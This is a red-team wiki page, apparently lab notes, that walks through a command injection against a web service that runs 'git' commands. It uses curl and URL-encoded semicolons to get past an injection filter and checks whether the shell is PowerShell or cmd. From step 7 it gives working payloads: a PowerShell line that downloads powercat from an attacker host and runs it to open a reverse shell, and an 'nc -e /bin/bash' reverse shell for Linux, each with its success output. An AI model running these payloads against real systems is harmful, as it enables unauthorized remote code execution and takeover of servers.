---
title: Command-Injection_git
parent: Attack Repository
grand_parent: Red Team
nav_order: 1
has_children: true
---
# enable_git
A server that accepts Git commands
## Procedure
Perform a command injection on a site that allows you to upload any repository using the `git clone` command

### 1. Launch Burp and prepare to intercept traffic

### 2. Access the site via a browser and perform a normal upload operation

### 3. Review the intercepted traffic in Burp

You can confirm that a POST request in the format `Archive=command` is being sent to the `/archive` directory.

### 4. Check the difference in responses compared to other commands
```bash
curl -X POST --data ‘Archive=ipconfig’ http://192.168.121.189:8000/archive
```

- Success Result:
```bash
Command Injection detected. Aborting...%! (EXTRA string=ipconfig)
```

```bash
curl -X POST --data ‘Archive=git version’ http://192.168.121.189:8000/archive
```

- Success Result: 
```bash
Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
```

### 5. Send “git” URL-encoded with a semicolon (;) and “ipconfig”
```bash
curl -X POST --data ‘Archive=git%3Bipconfig’ http://192.168.121.189:8000/archive
```

- Success Result: 
```bash
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.121.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.121.254
```
 

### 6. Checking whether the inserted command is in PowerShell or cmd
Code snippet to check where the code is being executed
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*% 60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.121.189:8000/archive
```

- Success Result: 
```bash
PowerShell
```

### 7. Accessing the shell

Use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali.
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

Launch a new terminal, copy Powercat to the Kali user's home directory, and start a Python 3 web server in the same directory.
```bash
python3 -m http.server 80
```

Open a third terminal tab to create a Netcat listener on port 4444 to capture the reverse shell.
```bash
nc -nvlp 4444
```

URL-encode the following and embed it into the command, then send it
```bash
IEX (New-Object System.Net.Webclient).DownloadString(“http://192.168.45.204/powercat.ps1”);powercat -c 192.168.45.204 -p 4444 -e powershell 
```

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.204%2Fpowercat.ps1%22)% 'powercat -c 192.168.45.204 -p 4444 -e powershell' http://192.168.121.189:8000/archive
```

- Success Result: 
```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.121.189] 63599
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows


PS C:\Users\Administrator\Documents\meteor> whoami
whoami
mountain\administrator

PS C:\Users\Administrator\Documents\meteor> 
```

### 8. If the target is Linux

Start the Netcat listener
```bash
rlwrap nc -nlvp 4444
```

Send `nc 192.168.45.204 4444 -e /bin/bash`
```bash
curl -X POST --data ‘Archive=git%3B/bin/nc%20192.168.45.204%204444%20-e%20/bin/bash’ http://192.168.121.16/archive
```
